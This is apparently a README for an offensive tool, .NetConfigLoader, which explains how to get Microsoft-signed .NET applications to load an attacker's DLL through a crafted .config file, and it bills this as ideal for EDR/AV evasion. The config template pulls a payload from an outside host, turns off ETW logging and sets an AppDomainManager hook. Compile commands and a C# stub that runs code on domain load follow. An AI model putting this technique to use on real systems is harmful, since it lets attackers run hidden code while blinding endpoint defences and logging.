# .NetConfigLoader

List of .Net application signed by Microsoft that can be used to load a dll via a .config file. Ideal for EDR/AV evasion and execution policy bypass.

```
<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <dependentAssembly>
            <assemblyIdentity name="DLLNAME" publicKeyToken="deadbeef1337" culture="neutral" />
            <codeBase version="0.0.0.0" href="https://mr.un1k0d3r.world/payload"/>
         </dependentAssembly>
      </assemblyBinding>
      <etwEnable enabled="false" />
      <appDomainManagerAssembly value="DLLNAME, Version=0.0.0.0, Culture=neutral, PublicKeyToken=deadbeef1337" />
      <appDomainManagerType value="CLASSNAME" />
   </runtime>
</configuration>
```
# Compiling the DLL

The DLL needs to have strong name

`sn.exe -k key.snk`

`csc.exe /t:library /keyfile:key.snk /out:my.dll Program.cs`

Getting the strong name information for the .config file

`[System.Reflection.AssemblyName]::GetAssemblyName("C:\full\path\to\dll\my.dll").FullName`

# The DLL Structure

```
using System;
 
public sealed class CLASSNAME : AppDomainManager
{
    
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {  
         
        Program.Main(null);
          
        return;
    }
}
```
